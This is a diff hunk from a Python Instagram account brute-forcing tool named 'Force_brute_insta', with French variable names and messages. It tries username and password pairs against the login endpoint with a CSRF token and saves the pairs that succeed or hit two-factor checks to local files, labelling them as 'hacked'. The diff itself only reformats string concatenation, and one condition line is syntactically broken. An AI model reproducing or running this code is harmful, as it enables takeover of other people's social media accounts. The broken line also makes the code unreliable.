@@ -235,15 +235,15 @@ class Force_brute_insta(object):
                 "x-csrftoken": _csrf_jeton
             })
             #print(f"{utilisateur}:{pwd}\n╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬")
-            print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m "+utilisateur+"\033[1;91m :\033[1;93m "+pwd"\033[1;97m\n╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬")
+            print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m " + utilisateur + "\033[1;91m :\033[1;93m " + pwd + "\033[1;97m\n╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬═══╬")
             if "authenticated": true" in _reqs.text:
-                print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m "+ utilisateur + "\033[1;91m: \033[1;96m" + pwd + "\033[1;91m -->\033[1;97m Bien pirater")
+                print("\033[1;91m[\033[1;93m+\033[1;91m]\033[1;97m " + utilisateur + "\033[1;91m: \033[1;96m" + pwd + "\033[1;91m -->\033[1;97m Bien pirater")
                 with open("faxelm.txt", "a") as saves:
-                    saves.write("#Faxel\n"+utilisateur + ":" + pwd + "\n")
+                    saves.write("#Faxel\n" + utilisateur + ":" + pwd + "\n")
             elif "two_factor_required" in _reqs.text:   
                 print("\033[1;91m[\033[1;93m*\033[1;91m]\033[1;97m "+ utilisateur + "\033[1;91m: \033[1;93m" + pwd + "\033[1;91m -->\033[1;97m Bon il faut vérifier")
                 with open("Faxelh.txt", "a") as sauves:
-                    sauves.write("#Faxel\n"+utilisateur + ":" + pwd + "\n")
+                    sauves.write("#Faxel\n" + utilisateur + ":" + pwd + "\n")
 ####################################################################################################
 ####################################################################################################            
 if __name__ == "__main__":
